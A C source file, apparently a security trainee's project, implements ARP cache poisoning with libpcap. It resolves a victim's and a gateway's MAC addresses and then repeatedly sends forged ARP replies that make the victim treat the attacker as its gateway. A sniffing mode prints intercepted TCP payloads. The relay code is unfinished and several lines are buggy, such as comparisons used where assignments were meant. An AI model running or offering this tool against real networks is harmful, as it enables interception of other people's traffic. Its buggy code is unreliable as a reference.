
/*
KITRI BEST OF THE BEST 6TH
CONSULTING PeTrA 
CHO HUI GWON
*/
//#include <Qcorepplication>
#include <netinet/in.h>
#include <netinet/ether.h>
//#include <fstream>
#include <stdlib.h>
#include <arpa/inet.h>

#include <pcap.h>
#include <stdio.h>

#include <stdint.h>
#include <string.h>
#include <unistd.h>
/*
Header Structure 
*/
/*
struct ether_addr{
        unsigned char ether_addr_octet[6];
};
*/
/*
struct ether_header{
        struct  ether_addr ether_dhost;
        struct  ether_addr ether_shost;
        unsigned short ether_type;
};*/

struct ip_header{
        unsigned char ip_header_len:4;
        unsigned char ip_version:4;
        unsigned char ip_tos;
        unsigned short ip_total_length;
        unsigned short ip_id;
        unsigned char ip_frag_offset:5;
        unsigned char ip_more_fragment:1;
        unsigned char ip_dont_fragment:1;
        unsigned char ip_reserved_zero:1;
        unsigned char ip_frag_offset1;
        unsigned char ip_ttl;
        unsigned char ip_protocol;
        unsigned short ip_checksum;
        struct in_addr ip_srcaddr;
        struct in_addr ip_destaddr;
};
 
struct tcp_header{
        unsigned short source_port;
        unsigned short dest_port;
	/*
	unsigned int -> uint16_t (stdint.h)
	*/
	uint16_t sequence;
	uint16_t acknowledge;
	/*
        unsigned int sequence;
        unsigned int acknowledge;
	*/
        unsigned char ns:1;
        unsigned char reserved_part1:3;
        unsigned char data_offset:4;
        unsigned char fin:1;
        unsigned char syn:1;
        unsigned char rst:1;
        unsigned char psh:1;
        unsigned char ack:1;
        unsigned char urg:1;
        unsigned char ecn:1;
        unsigned char cwr:1;
        unsigned short window;
        unsigned short checksum;
        unsigned short urgent_pointer;
};

/*
Header print Function
*/ 
void print_ether_header(const unsigned char *data);
int print_ip_header(const unsigned char *data);
int print_tcp_header(const unsigned char *data);
void print_data(const unsigned char *data);

int exceptionNum = 0;	//	exception : if((!ether) || (!ip) || (!tcp) )
char addr_buf[20];	//	buffer for IP Address

int sendArpReply(pcap_t *handle, struct pcap_pkthdr *header, char *senderMAC, char *senderIP, char *targetMAC, char *targetIP);
void sendArp(pcap_t *_handle, char *_shost, char *_dhost, char *_sha, char *_spa, char *_tha, char *_tpa, int _operation);
void make_relay_packet(const unsigned char *data, char *_smac, char *_dmac);
//void make_relay_packet(const unsigned char* data, char* macAddr);
char *MY_MAC;
char *MY_IP;
char *VICTIM_MAC;
char *VICTIM_IP;
char *GATEWAY_MAC;
char *GATEWAY_IP;
char *BROADCAST_MAC;

char *TEMP_SMAC;
char *TEMP_DMAC;
char TEMP_SIP[20];
char TEMP_DIP[20];
/*
Main Function
*/
int main(int argc, char *argv[]){
	int res;	//	test
	pcap_t *handle;
	char *dev;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program fp;
	// char filter_exp[] = "port 80";
	bpf_u_int32 mask;
	bpf_u_int32 net;
	struct pcap_pkthdr *header;
	const u_char *packet;
	int temp = 0;	//	tempNumber;
	//dev = pcap_lookupdev(errbuf);
	
	char *senderIP;
	char *targetIP;
	u_char mypacket[42];

	int key = 0;
	int i;

	char senderMAC[18];
	char targetMAC[18];
	char targetMAC2[18];
	char gatewayMAC[18];
	char myIP[16];
	char gatewayIP[16];
	
	char bufff[256];
	FILE *tempfp;

	struct ether_header *eth;
	struct ether_arp *arp;

	if(argc == 1){
		printf("ERROR : Send dev name\n");
		return 0;
	}

	dev = argv[1];
	
	if(argc == 2){
		printf("ERROR : Write sender IP Address\n");
		return 0;
	}
	
	senderIP = argv[2];

	if(argc == 3){
		printf("ERROR : Write target IP Address\n");
		return 0;
	}
	
	targetIP = argv[3];

	tempfp = popen("ifconfig | grep \"ether\" | awk '{print $2'}", "r");
	if(tempfp == NULL){
		perror("popen failed");
		return -1;
	}
	
	fscanf(tempfp, "%s", senderMAC);
	pclose(tempfp);
	
	tempfp = popen("ifconfig | grep \"inet\" | sed -n 1p | awk '{print $2'}", "r");
	if(tempfp == NULL){
		perror("popen failed");
		return -1;
	}
	fscanf(tempfp, "%s", myIP);
	pclose(tempfp);
	
	tempfp = popen("netstat -rn | grep 0.0.0.0 | sed -n 1p | awk '{print $2}'", "r");
	if(tempfp == NULL){
		perror("popen failed");
		return -1;
	}

	fscanf(tempfp, "%s", gatewayIP);
	pclose(tempfp);
	
	printf("Device : %s\n", dev);	//	print Interface Device

	MY_MAC 	= senderMAC;
	MY_IP 	= myIP;
	VICTIM_MAC;
	VICTIM_IP = senderIP;
	GATEWAY_MAC;
	GATEWAY_IP = gatewayIP;

	printf("Attacker MAC Address	: %s\n", MY_MAC);
	printf("Attacker IP Address 	: %s\n", MY_IP);
	printf("Victim MAC Address	: %s\n", VICTIM_MAC);
	printf("Victim IP Address	: %s\n", VICTIM_IP);
	printf("Gateway MAC Address 	: %s\n", GATEWAY_MAC);
	printf("Gateway IP Address	: %s\n", GATEWAY_IP);
	
	BROADCAST_MAC = "ff:ff:ff:ff:ff:ff";
	
	if(dev == NULL){
		fprintf(stderr, "Couldn't find default device : %s\n", errbuf);
		return (2);
	}

	if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1){
		fprintf(stderr, "Couldn't get netmask for device %s : %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}
	
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if(handle == NULL){
		fprintf(stderr, "Couldn't open device %s : %s\n", dev, errbuf);
		return (2);
	}
	/*	
	if(pcap_compile(handle, &fp, filter_exp, 0, net) == -1){
		fprintf(stderr, "Couldn't parse filter %s : %s\n", filter_exp, pcap_geterr(handle));
		return (2);
	}*/
	/*	
	if(pcap_setfilter(handle, &fp) == -1){
		fprintf(stderr, "Couldn't install filter %s : %s\n", filter_exp, pcap_geterr(handle));
		return (2);
	}*/
	eth = (struct ether_header *)mypacket;
	ether_aton_r("ff:ff:ff:ff:ff:ff", (struct ether_addr *)eth->ether_dhost);
	ether_aton_r(MY_MAC, (struct ether_addr *)eth->ether_shost);
	eth->ether_type = htons(ETHERTYPE_ARP);

	arp = (struct ether_arp *)(mypacket + ETH_HLEN);
	arp->arp_hrd = htons(ARPHRD_ETHER);	// Hardware type
	arp->arp_pro = htons(ETHERTYPE_IP);	// Protocol type
	arp->arp_hln = ETHER_ADDR_LEN;		// Hardware length
	arp->arp_pln = sizeof(struct in_addr);	// Protocol length
	arp->arp_op = htons(ARPOP_REQUEST);	// operation request : 1, repley : 2
	ether_aton_r(MY_MAC, (struct ether_addr *)arp->arp_sha);	// Sender Hardware Address
	inet_pton(AF_INET, MY_IP, arp->arp_spa);	// Sender IP Address
	ether_aton_r("ff:ff:ff:ff:ff:ff", (struct ether_addr *)arp->arp_tha);	// Target Hadware Address
	inet_pton(AF_INET, VICTIM_IP, arp->arp_tpa);	// Sender IP Address
	if(pcap_sendpacket(handle, mypacket, sizeof(mypacket)) == -1){
		printf("Error : Fail to send the ARP Request\n");
		return 0;
	}else{
		printf("Sending ARP Request is Success :) \n");
	}

	while(1){
		exceptionNum = 0;
		res = pcap_next_ex(handle, &header, &packet);
		printf("Jacked a packet with length of [%d]\n", header->len);
	
		if(res == 0){
			continue;
		}else if(res == -1){
			printf("Error : Fail to read the packets");
			continue;
		}

		eth = (struct ether_header *)packet;
		arp = (struct ether_arp *)(packet + ETH_HLEN);

		if(ntohs(eth->ether_type) == ETHERTYPE_ARP){
			sprintf(targetMAC, "%s", ether_ntoa(((struct ether_addr *)arp->arp_sha)));
			printf("Received target MAC Address :)\n");
			break;
		}
	}
	VICTIM_MAC = targetMAC;

	eth = (struct ether_header *)mypacket;
	ether_aton_r("ff:ff:ff:ff:ff:ff", (struct ether_addr *)eth->ether_dhost);
	ether_aton_r(MY_MAC, (struct ether_addr *)eth->ether_shost);
	eth->ether_type = htons(ETHERTYPE_ARP);

	arp = (struct ether_arp *)(mypacket + ETH_HLEN);
	arp->arp_hrd = htons(ARPHRD_ETHER);	// Hardware type
	arp->arp_pro = htons(ETHERTYPE_IP);	// Protocol type
	arp->arp_hln = ETHER_ADDR_LEN;		// Hardware length
	arp->arp_pln = sizeof(struct in_addr);	// Protocol length
	arp->arp_op = htons(ARPOP_REQUEST);	// operation request : 1, repley : 2
	ether_aton_r(MY_MAC, (struct ether_addr *)arp->arp_sha);	// Sender Hardware Address
	inet_pton(AF_INET, MY_IP, arp->arp_spa);	// Sender IP Address
	ether_aton_r("ff:ff:ff:ff:ff:ff", (struct ether_addr *)arp->arp_tha);	// Target Hadware Address
	inet_pton(AF_INET, GATEWAY_IP, arp->arp_tpa);	// Sender IP Address
	if(pcap_sendpacket(handle, mypacket, sizeof(mypacket)) == -1){
		printf("Error : Fail to send the ARP Request\n");
		return 0;
	}else{
		printf("Sending ARP Request is Success :) \n");
	}

	while(1){
		exceptionNum = 0;
		res = pcap_next_ex(handle, &header, &packet);
		printf("Jacked a packet with length of [%d]\n", header->len);
	
		if(res == 0){
			continue;
		}else if(res == -1){
			printf("Error : Fail to read the packets");
			continue;
		}

		eth = (struct ether_header *)packet;
		arp = (struct ether_arp *)(packet + ETH_HLEN);

		if(ntohs(eth->ether_type) == ETHERTYPE_ARP){
			sprintf(targetMAC2, "%s", ether_ntoa(((struct ether_addr *)arp->arp_sha)));
			printf("Received target MAC Address :)\n");
			break;
		}
	}
	GATEWAY_MAC = targetMAC2;
	
	printf("Attacker MAC Address	: %s\n", MY_MAC);
	printf("Attacker IP Address 	: %s\n", MY_IP);
	printf("Victim MAC Address	: %s\n", VICTIM_MAC);
	printf("Victim IP Address	: %s\n", VICTIM_IP);
	printf("Gateway MAC Address 	: %s\n", GATEWAY_MAC);
	printf("Gateway IP Address	: %s\n", GATEWAY_IP);
	
	printf("1 : Watch packet ||||| 2 : Send packet\n");
	printf("OK, Ready to move. Select the Object :) >> ");
	scanf("%d", &key);

	if(key == 1){
		while(1){
			exceptionNum == 0;
			res = pcap_next_ex(handle, &header, &packet);
			printf("Jacked a packet with length of [%d]\n", header->len);
		
			if(res == 0){
				continue;
			}else if(res == -1){
				printf("Error : Fail to read the packets");
				continue;
			}
		
			print_ether_header(packet);
			if(exceptionNum == 1){
				continue;
			}
			packet = packet + 14;
			temp = print_ip_header(packet);
			if(exceptionNum == 1){
				continue;
			}
			packet = packet + temp;
			temp = print_tcp_header(packet);
	
			packet = packet + temp;
			print_data(packet);
		}
	}else if(key == 2){
		
		while(1){
	
		
		//Victim infect	
		sendArp(handle, MY_MAC, VICTIM_MAC, MY_MAC, GATEWAY_IP, VICTIM_MAC, VICTIM_IP, 2);	//shost, dhost, sha, spa, tha, tpa :

		//Gateway infect
		/*
		sendArp(handle, MY_MAC, GATEWAY_MAC, MY_MAC, VICTIM_IP, GATEWAY_MAC, GATEWAY_IP, 2);*/
		sleep(2);
		}
		
	}else{}
	pcap_close(handle);
	return (0);
}

/*
Ethernet header print Function
*/
void print_ether_header(const unsigned char* data){
	struct ether_header *ether_head;
	unsigned short ether_type;
	ether_head = (struct ether_header *)data;
	
	ether_type = ntohs(ether_head->ether_type);
	
	if(ether_type != 0x0800){	//	if( !(ip))
		printf("Not IP Type\n");
		exceptionNum == 1;
		return;
		/*Return*/
		
	}
	
	printf("Dst Mac Addr [%02x:%02x:%02x:%02x:%02x:%02x]\n",
				ether_head->ether_dhost[0],
				ether_head->ether_dhost[1],
				ether_head->ether_dhost[2],
				ether_head->ether_dhost[3],
				ether_head->ether_dhost[4],
				ether_head->ether_dhost[5]);
	
	printf("Src Mac Addr [%02x:%02x:%02x:%02x:%02x:%02x]\n",
				ether_head->ether_shost[0],
				ether_head->ether_shost[1],
				ether_head->ether_shost[2],
				ether_head->ether_shost[3],
				ether_head->ether_shost[4],
				ether_head->ether_shost[5]);
				
	/*
	printf("Dst Mac Addr : %s\n", ether_head->ether_dhost);
	printf("Src Mac Addr : %s\n", ether_head->ether_shost);
	*/
}

void make_relay_packet(const unsigned char *data, char *_smac, char *_dmac){
	struct ether_header *ether_head;
	unsigned short ether_type;
	ether_head = (struct ether_header *)data;

	memcpy(ether_head->ether_shost, (u_char *)_smac, 6);
	memcpy(ether_head->ether_dhost, (u_char *)_dmac, 6);	
	for(int i=0;i<6;i++) printf(" %02x",ether_head->ether_shost[i]);
	/*ether_head->ether_shost = (u_char *)_smac;
	ether_head->ether_dhost = (u_char *)_dmac;*/
	return;
}
void save_mac_addr(const unsigned char *data){
	struct ether_header *ether_head;
	unsigned short ether_type;
	ether_head = (struct ether_header *)data;
	/*
	TEMP_SMAC = ether_head->ether_shost;
	TEMP_DMAC = ether_head->ether_dhost;
	*/
	return;
}
/*
void make_relay_packet(const unsigned char* data, char* macAddr){
	struct ether_header *ether_head;
	ether_head = (struct ether_header *)data;
	ether_aton_r(macAddr, (struct ether_addr *)ether_head->ether_dhost);	
	//ether_aton_r(senderMAC, (struct ether_addr *)eth->ether_shost);
	//eth->ether_type = htons(ETHERTYPE_ARP);
	return;
}*/

/*
IP header print Function
*/
int print_ip_header(const unsigned char* data){
	struct ip_header *ip_head;
	ip_head = (struct ip_header*)data;
	
	/*
	char buf1[32] = {0, };
	char buf2[32] = {0, };E
	inet_pton(AF_INET, inet_ntoa(ip_head->ip_srcaddr), 
	
	*/
	if((ip_head->ip_protocol) != 0x06){	//	if( !(tcp))
		exceptionNum == 1;
		return ip_head->ip_header_len*4;
	}

	//printf("Src IP Address : %s\n", inet_ntop(AF_INET, 
	inet_ntop(AF_INET, &(ip_head->ip_srcaddr), addr_buf, sizeof(addr_buf));
	printf("Src IP Address : %s\n", addr_buf);
	inet_ntop(AF_INET, &(ip_head->ip_destaddr), addr_buf, sizeof(addr_buf));
	printf("Dst IP Address : %s\n", addr_buf);
	/*
	printf("Src IP Address : %s\n", inet_ntoa(ip_head->ip_srcaddr));
	printf("Dst Ip Address : %s\n", inet_ntoa(ip_head->ip_destaddr));
	*/
	return ip_head->ip_header_len*4;
}

void save_ip_addr(const unsigned char *data){
	struct ip_header *ip_head;
	ip_head = (struct ip_header *)data;

	inet_ntop(AF_INET, &(ip_head->ip_srcaddr), TEMP_SIP, sizeof(TEMP_SIP));
	inet_ntop(AF_INET, &(ip_head->ip_destaddr), TEMP_DIP, sizeof(TEMP_DIP));
	
	return;
}

int returnIp(const unsigned char* data){
	struct ip_header *ip_head;
	ip_head = (struct ip_header*)data;
	char *returnValue;
	if((ip_head->ip_protocol) != 0x06){	//	if( !(tcp))
		//exceptionNum == 1;
		return ip_head->ip_header_len*4;
	}
	//inet_ntop(AF_INET, &(ip_head->ip_srcaddr), addr_buf, sizeof(addr_buf));
	//printf("Src IP Address : %s\n", addr_buf);
	inet_ntop(AF_INET, &(ip_head->ip_destaddr), addr_buf, sizeof(addr_buf));
	//printf("Dst IP Address : %s\n", addr_buf);
	
	return ip_head->ip_header_len*4;
}
/*
TCP header print Function
*/
int print_tcp_header(const unsigned char* data){
	struct tcp_header *tcp_head;
	tcp_head = (struct tcp_header*)data;
	printf("Src Port : %d\n", ntohs(tcp_head->source_port));
	printf("Dst Port : %d\n", ntohs(tcp_head->dest_port));
	return tcp_head->data_offset*4;
}

/*
Data print Function
*/
void print_data(const unsigned char *data){
	printf("DATA\n");
	printf("%s\n", data);
}


/*
send Arp : (handle, ether_shost, ether_dhost, arp_smac, arp_sip, arp_tmac, arp_tip, op)
*/
void sendArp(pcap_t *_handle, char *_shost, char *_dhost, char *_sha, char *_spa, char *_tha, char *_tpa, int _operation){
	u_char sendPacket[42];
	struct ether_header *_eth;
	struct ether_arp *_arp;
	int res;	
	_eth = (struct ether_header *)sendPacket;
	ether_aton_r(_dhost, (struct ether_addr *)_eth->ether_dhost);	//	ether header : dhost
	ether_aton_r(_shost, (struct ether_addr *)_eth->ether_shost);	//	ether header : shost
	_eth->ether_type = htons(ETHERTYPE_ARP);

	_arp = (struct ether_arp *)(sendPacket + ETH_HLEN);
	_arp->arp_hrd = htons(ARPHRD_ETHER);	// Hardware type
	_arp->arp_pro = htons(ETHERTYPE_IP);	// Protocol type
	_arp->arp_hln = ETHER_ADDR_LEN;		// Hardware length
	_arp->arp_pln = sizeof(struct in_addr);	// Protocol length
	if(_operation == 1){
		printf("Request\n");
		_arp->arp_op = htons(ARPOP_REQUEST);	// operation request : 1, repley : 2
	}else if(_operation == 2){
		printf("Reply\n");
		_arp->arp_op = htons(ARPOP_REPLY);
	}else{
		printf("ERROR : PLZ, SELECT ARP OPERATION\n");
		return;       	
	}
	ether_aton_r(_sha, (struct ether_addr *)_arp->arp_sha);	// Sender Hardware Address
	inet_pton(AF_INET, _spa, _arp->arp_spa);		// Sender IP Address
	ether_aton_r(_tha, (struct ether_addr *)_arp->arp_tha);	// Target Hadware Address
	inet_pton(AF_INET, _tpa, _arp->arp_tpa);		// Sender IP Address
	if(pcap_sendpacket(_handle, sendPacket, sizeof(sendPacket)) == -1){
		printf("Error : Fail to send the ARP Packet\n");
		return;
	}else{
		printf("Sending ARP Packet is Success :) \n");
	}
}



/*
return 1 : Sccess,   return 0 : not excute,   return -1 : failed
 
int sendArpReply(pcap_t *handle, struct pcap_pkthdr *header, char *senderMAC, char *senderIP, char *targetMAC, char *targetIP){
	u_char mypacket[42];
	struct ether_header *eth;
	struct ether_arp *arp;
	int res;
	const u_char *packet;
	eth = (struct ether_header *)mypacket;
	ether_aton_r("ff:ff:ff:ff:ff:ff", (struct ether_addr *)eth->ether_dhost);
	ether_aton_r(senderMAC, (struct ether_addr *)eth->ether_shost);
	eth->ether_type = htons(ETHERTYPE_ARP);
	arp = (struct ether_arp *)(mypacket + ETH_HLEN);
	arp->arp_hrd = htons(ARPHRD_ETHER);	// Hardware type
	arp->arp_pro = htons(ETHERTYPE_IP);	// Protocol type
	arp->arp_hln = ETHER_ADDR_LEN;		// Hardware length
	arp->arp_pln = sizeof(struct in_addr);	// Protocol length
	arp->arp_op = htons(ARPOP_REQUEST);	// operation request : 1, repley : 2
	ether_aton_r(senderMAC, (struct ether_addr *)arp->arp_sha);	// Sender Hardware Address
	inet_pton(AF_INET, senderIP, arp->arp_spa);	// Sender IP Address
	ether_aton_r("ff:ff:ff:ff:ff:ff", (struct ether_addr *)arp->arp_tha);	// Target Hadware Address
	inet_pton(AF_INET, targetIP, arp->arp_spa);	// Sender IP Address
	if(pcap_sendpacket(handle, mypacket, sizeof(mypacket)) == -1){
		printf("Error : Fail to send the ARP Request\n");
		return (-1);
	}else{
		printf("Sending ARP Request is Success :) \n");
	}
	while(1){
		exceptionNum == 0;
		res = pcap_next_ex(handle, &header, &packet);
		printf("Jacked a packet with length of [%d]\n", header->len);
		
		if(res == 0){
			continue;
		}else if(res == -1){
			printf("Error : Fail to read the packets");
			continue;
		}

		eth = (struct ether_header *)packet;
		arp = (struct ether_arp *)(packet + ETH_HLEN);

		if(ntohs(eth->ether_type) == ETHERTYPE_ARP){
			sprintf(targetMAC, "%s", ether_ntoa(((struct ether_addr *)arp->arp_sha)));
			printf("Received target MAC Address :)\n");
			break;
		}
	}

	eth = (struct ether_header *)mypacket;
	ether_aton_r(targetMAC, (struct ether_addr *)eth->ether_dhost);
	ether_aton_r(senderMAC, (struct ether_addr *)eth->ether_shost);
	eth->ether_type = htons(ETHERTYPE_ARP);
	arp = (struct ether_arp *)(mypacket + ETH_HLEN);
	arp->arp_hrd = htons(ARPHRD_ETHER);	// Hardware type
	arp->arp_pro = htons(ETHERTYPE_IP);	// Protocol type
	arp->arp_hln = ETHER_ADDR_LEN;		// Hardware length
	arp->arp_pln = sizeof(struct in_addr);	// Protocol length
	arp->arp_op = htons(ARPOP_REPLY);	// operation request : 1, reply : 2
	ether_aton_r(senderMAC, (struct ether_addr *)arp->arp_sha);	// Sender Hardware Address
	inet_pton(AF_INET, senderIP, arp->arp_spa);	// Sender IP Address
	ether_aton_r(targetMAC, (struct ether_addr *)arp->arp_tha);	// Target Hadware Address
	inet_pton(AF_INET, targetIP, arp->arp_spa);	// Sender IP Address
	if(pcap_sendpacket(handle, mypacket, sizeof(mypacket)) == -1){
		printf("Error : Fail to send the ARP Reply\n");
		return -1;
	}else{
		printf("Sending ARP Reply is Success :) \n");
		return 1;
	}
	return 0;
}
*/
int sendRelay(struct pcap_pkthdr *_header, const u_char *_packet, pcap_t *_handle){
	int exceptionNum;
	int res;
	int temp;
	while(1){
		exceptionNum = 0;
		res = pcap_next_ex(_handle, &_header, &_packet);
		//printf("Jacked a packet with length of [%d]\n", header->len);
	
		if(res == 0){
			continue;
		}else if(res == -1){
			printf("Error : Fail to read the packets");
			continue;
		}
		
		save_mac_addr(_packet);
	//	print_ether_header(packet);
		if(exceptionNum == 1){
			continue;
		}
		_packet = _packet + 14;
		save_ip_addr(_packet);

		if(((!(strcmp(TEMP_SMAC, VICTIM_MAC))) && (!(strcmp(TEMP_DMAC, MY_MAC)))) && ((!(strcmp(TEMP_SIP, VICTIM_IP))) && (!(strcmp(TEMP_DIP, GATEWAY_IP))))){
			/* if victim packet to gateway reach to me */

		}
		/*
		if(strcmp(addr_buf, )){	//	if ip address is not my ip address : relay 
			printf("relay\n");
			packet = packet -14;
			make_relay_packet(packet, gatewayMAC); 
			if(pcap_sendpacket(handle, packet, sizeof(packet)) == -1){
			printf("Error : Fail to send the ARP Reply\n");
			return 0;
		}*/
		if(exceptionNum == 1){
			continue;
		}
		_packet = _packet + temp;
		temp = print_tcp_header(_packet);
		_packet = _packet + temp;
		print_data(_packet);
	}
}
/*			exceptionNum == 0;
			res = pcap_next_ex(handle, &header, &packet);
			printf("Jacked a packet with length of [%d]\n", header->len);
		
			if(res == 0){
				continue;
			}else if(res == -1){
				printf("Error : Fail to read the packets");
				continue;
			}
		
			print_ether_header(packet);
			if(exceptionNum == 1){
				continue;
			}
			packet = packet + 14;
			temp = print_ip_header(packet);
			if(exceptionNum == 1){
				continue;
			}
			packet = packet + temp;
			temp = print_tcp_header(packet);
	
			packet = packet + temp;
			print_data(packet);
		}*/
